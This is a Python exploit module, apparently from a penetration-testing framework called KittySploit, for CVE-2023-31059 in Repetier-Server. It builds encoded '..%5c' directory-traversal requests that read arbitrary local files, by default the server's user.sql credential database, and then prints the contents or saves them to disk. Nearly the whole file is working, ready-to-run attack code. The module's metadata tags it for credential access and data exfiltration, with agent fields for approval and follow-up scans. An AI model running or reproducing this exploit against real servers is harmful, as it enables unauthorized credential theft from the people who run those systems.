#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Repetier-Server directory traversal arbitrary file read (CVE-2023-31059)."""

import re
import urllib.parse

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Repetier-Server Directory Traversal File Read (CVE-2023-31059)',
        'description': (
            'CVE-2023-31059 in Repetier-Server through 1.4.10: encoded ..\\ traversal via '
            '/views.../base/connectionLost.php reads local files such as '
            'ProgramData/Repetier-Server/database/user.sql (credentials).'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2023-31059'],
        'platform': Platform.MULTI,
        'references': [
            'https://cybir.com/2023/cve/poc-repetier-server-140/',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-31059',
        ],
        'tags': ['repetier', 'repetier-server', 'lfi', 'file-read', 'windows'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals', 'credentials'],
            'chain': {
                'suggested_followups': ['scanner/http/cve_2023_31059_detect'],
            },
        },
    }

    read_path = OptString(
        'ProgramData/Repetier-Server/database/user.sql',
        'Windows-relative path (forward slashes) under traversal',
        required=False,
    )
    depth = OptInt(16, 'Number of ..\\ segments (URL-encoded as ..%5c)', required=False, advanced=True)
    output_file = OptString('', 'Local path to save retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars printed when output_file empty (0=all)', required=False, advanced=True)

    def _build_path(self, rel_path: str) -> str:
        rel = str(rel_path or '').strip().replace('/', '\\').strip('\\')
        segments = max(4, int(self.depth or 16))
        trav = '..%5c' * segments
        parts = [p for p in rel.split('\\') if p]
        encoded_tail = '%5c'.join(urllib.parse.quote(part, safe='') for part in parts)
        return f'/views{trav}{encoded_tail}%20/base/connectionLost.php'

    def execute(self, file_path: str) -> str:
        rel = str(file_path or self.read_path or '').strip()
        path = self._build_path(rel)
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return ''
        return r.text or ''

    def check(self):
        body = self.execute('ProgramData/Repetier-Server/database/user.sql')
        raw = body.encode('utf-8', errors='ignore') if body else b''
        if b'SQLite format 3\x00' in raw or re.search(r'INSERT INTO\s+"?users"?', body or '', re.I):
            return {
                'vulnerable': True,
                'reason': 'CVE-2023-31059: Repetier user.sql readable',
                'confidence': 'high',
            }
        return {'vulnerable': False, 'reason': 'Traversal read failed', 'confidence': 'medium'}

    def run(self):
        remote = str(self.read_path or '').strip()
        data = self.execute(remote)
        if not data:
            print_error('File read failed')
            return False
        print_success(f'Read {len(data)} bytes from {remote}')
        local = str(self.output_file or '').strip()
        if local:
            try:
                with open(local, 'w', encoding='utf-8', errors='ignore') as fh:
                    fh.write(data)
                print_success(f'Wrote content to {local}')
            except OSError as exc:
                print_error(f'Could not write output_file: {exc}')
                return False
        else:
            limit = int(self.output_limit or 0)
            snippet = data if not limit or len(data) <= limit else data[:limit] + '\n... [truncated]'
            print_info(snippet)
        return True
